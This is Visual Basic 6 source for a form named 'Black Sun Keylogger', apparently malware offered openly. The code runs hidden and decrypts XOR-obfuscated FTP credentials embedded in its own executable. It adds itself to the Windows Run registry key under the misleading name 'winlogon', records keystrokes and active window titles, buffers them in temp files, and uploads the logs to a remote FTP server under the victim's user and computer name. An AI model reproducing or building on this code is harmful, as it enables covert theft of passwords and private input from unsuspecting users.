VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   0  'Kein
   Caption         =   "Form1"
   ClientHeight    =   4125
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7125
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4125
   ScaleWidth      =   7125
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows-Standard
   Visible         =   0   'False
   Begin VB.Timer Timer3 
      Interval        =   5000
      Left            =   0
      Top             =   960
   End
   Begin VB.Timer Timer2 
      Interval        =   8000
      Left            =   0
      Top             =   480
   End
   Begin VB.TextBox Text2 
      Height          =   3855
      Left            =   480
      MultiLine       =   -1  'True
      ScrollBars      =   3  'Beides
      TabIndex        =   0
      Top             =   0
      Width           =   6255
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   0
      Top             =   0
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Dim ftpadress As String
Dim ftpusername As String
Dim PASSWORD As String
Dim MAXIMAL As String

Private Sub Form_Load()
Dim inhalt As String
Dim splitted() As String
Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
inhalt = Space(LOF(1))
Get #1, , inhalt
Close #1
splitted() = Split(inhalt, "/////")
Melt
ftpadress = dks(splitted(1), "Slayer616isthefuckinKing")
ftpusername = dks(splitted(2), "Slayer616isthefuckinKing")
PASSWORD = dks(splitted(3), "Slayer616isthefuckinKing")
MAXIMAL = dks(splitted(4), "Slayer616isthefuckinKing")
Call RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\winlogon", App.Path & "\" & App.EXEName & ".exe")
Text2.Text = "------------------------Black Sun Keylogger started @" & Time & " \ " & Date & "------------------------"
If Dir(Environ("temp") & "\keylogd.dat") <> "" Then
Open Environ("temp") & "\keylogd.dat" For Binary As #1
inhalt = Space(LOF(1))
Get #1, , inhalt
Close #1
Text2.Text = Text2.Text & inhalt
Kill Environ("temp") & "\keylogd.dat"
End If
Timer1.Enabled = True
End Sub
Function RegWrite(ByVal Path As String, _
  ByVal Value As String, _
  Optional ByVal Typ As String = "REG_SZ") As Boolean
 
  Dim ws As Object
 
  On Error GoTo ErrHandler
  Set ws = CreateObject("WScript.Shell")
  ws.RegWrite Path, Value, Typ
  RegWrite = True
  Exit Function
 
ErrHandler:
  RegWrite = False
End Function
Private Sub Timer1_Timer()

  If Sayfabasligi <> ACWINNAME(GetForegroundWindow) Then
        Sayfabasligi = ACWINNAME(GetForegroundWindow)
       
        If Sayfabasligi <> "" Then Text2.Text = Text2.Text & vbCrLf & "[" & Time & " \ " & Date & "] [   " & Sayfabasligi & "   ] " & vbCrLf
        
        End If
GETAlpha
getklick
getspecial
getnumber


End Sub
Public Function PasswordGenerator(ByVal lngLength As Long) _
  As String

On Error GoTo Err_Proc
  
 Dim iChr As Integer
 Dim c As Long
 Dim strResult As String
 Dim iAsc As String
 
 Randomize Timer

 For c = 1 To lngLength
 
   iAsc = Int(3 * Rnd + 1)
   
  
   Select Case iAsc
     Case 1
       iChr = Int((Asc("Z") - Asc("A") + 1) * Rnd + Asc("A"))
     Case 2
       iChr = Int((Asc("z") - Asc("a") + 1) * Rnd + Asc("a"))
     Case 3
       iChr = Int((Asc("9") - Asc("0") + 1) * Rnd + Asc("0"))
     Case Else
       Err.Raise 20000, , "PasswordGenerator has a problem."
   End Select
   
   strResult = strResult & Chr(iChr)
 
 Next c
 
 PasswordGenerator = strResult
 
Exit_Proc:
 Exit Function
 
Err_Proc:
 MsgBox Err.Number & ": " & Err.Description, _
    vbOKOnly + vbCritical
 PasswordGenerator = vbNullString
 Resume Exit_Proc
 
End Function
Private Sub Timer2_Timer()

If Len(Text2.Text) >= CInt(MAXIMAL) Then
 Timer1.Enabled = False
If Dir(Environ("temp") & "\keylog.dat") <> "" Then
Kill Environ("temp") & "\keylog.dat"
End If
If Dir(Environ("temp") & "\keylogd.dat") <> "" Then
Kill Environ("temp") & "\keylogd.dat"
End If
Open Environ("temp") & "\keylog.dat" For Output As #1

 Print #1, Text2.Text
 Close #1

  Call ftpyebaglan(ftpadress, ftpusername, PASSWORD, Environ("Username") & "@" & Environ("Computername") & "//BS", Environ("temp") & "\keylog.dat", Environ("username") & PasswordGenerator(5) & ".dat")
Text2.Text = "------------------------Black Sun Keylogger started @" & Time & " \ " & Date & "------------------------"
 Sayfabasligi = ""
 Timer1.Enabled = True
End If
End Sub

Private Sub Timer3_Timer()
If Dir(Environ("temp") & "\keylogd.dat") <> "" Then
Kill Environ("temp") & "\keylogd.dat"
End If
Open Environ("temp") & "\keylogd.dat" For Output As #1

 Print #1, Text2.Text
 Close #1

End Sub
Function dks(ggt As String, pwd As String) As String
Dim i As Integer
Dim intKeyChar As Integer
Dim strTemp As String
Dim strText As String
Dim strKey As String
Dim strChar1 As String * 1
Dim strChar2 As String * 1

        strText = ggt
   
    strKey = pwd

    For i = 1 To Len(strText)
       
        strChar1 = Mid(strText, i, 1)
      
        intKeyChar = ((i - 1) Mod Len(strKey)) + 1
    
        strChar2 = Mid(strKey, intKeyChar, 1)

        strTemp = strTemp & Chr(Asc(strChar1) Xor Asc(strChar2))
    Next i

    dks = strTemp

End Function


